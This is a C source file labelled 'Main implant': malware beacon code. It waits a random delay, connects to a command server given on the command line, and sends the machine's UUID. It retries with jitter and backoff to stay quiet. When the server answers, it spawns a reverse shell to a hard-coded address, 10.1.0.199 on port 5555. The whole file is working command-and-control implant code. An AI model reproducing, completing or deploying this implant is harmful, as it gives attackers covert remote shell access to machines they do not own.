/*
Main implant
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <unistd.h>
#include <arpa/inet.h>

#include "implant.h"

int rand_int(int max);
int main(int argc, char *argv[])
{
    /* 起動 */
    if (argc < 3)  {
        die("usage");
    }

    int delay_start = rand_int(7);
    sleep(delay_start);
    /* 終了開始 */

    int port, s, status, shellpid;
    char* uuid;
    char server_reply[36], server_addr[256];
    char* hostname = argv[1];

    pid_t pid, sid;

    char* ip_resolve = resolveIP(hostname);
    if (ip_resolve != NULL) {
        strcpy(server_addr, ip_resolve);
    } 
    
    port = strtol(argv[2], NULL, 10);

    struct sockaddr_in server;

    printf("%s", server_addr);
    server.sin_addr.s_addr = inet_addr(server_addr);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    uuid = get_uuid_machine_id();

    memmove(uuid+3, uuid, 33);
    uuid[0] = 0xe2;
    uuid[1] = 0x99;
    uuid[2] = 0xa5;

    struct timeval timeout;
    timeout.tv_sec = 3;
    timeout.tv_usec = 3000;

    int retry_count = 0;
    while(1){
        int jitter = rand_int(12); 

        if ((s=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
        {
           printf("Error creating socket\n"); 
           retry_count += 1;
           sleep((5 * retry_count) * jitter);
        }

        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

        if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
        {
            printf("connection error\n");
            retry_count += 1;
            sleep((5 * retry_count) * jitter);
            continue;
        }
        
        if(send(s, uuid, strlen(uuid), 0) < 0)
        {
            printf("error while sending transmission\n");
            retry_count += 1;
            sleep((5 * retry_count) * jitter);
            continue;
        }

        if(recv(s, server_reply, sizeof(server_reply), 0) <= 0)
        {
            ;
        } else {
            spawn_shell("10.1.0.199", 5555);
        }

        memset(server_reply, 0, 36);
        retry_count = 0;
        
        close(s); 
        sleep(5 * jitter);
    }
    
    return 0;
}

int rand_int(int max) {
    int divisor = RAND_MAX/(max+1);
    int randint;
    
    do {
        randint = rand()/divisor;
    } while (randint > max);

    return randint;
}

void reply(int s) {
    char buffer[8];
    int n;

    for (;;) {
        memset( buffer, 0, 8 );
        read(s, buffer, sizeof(buffer));
        printf("%s\n", buffer);
        if ((strncmp(buffer, "COMMAND1", 8)) == 0){
            break;
        } else
            break;
        
    }
}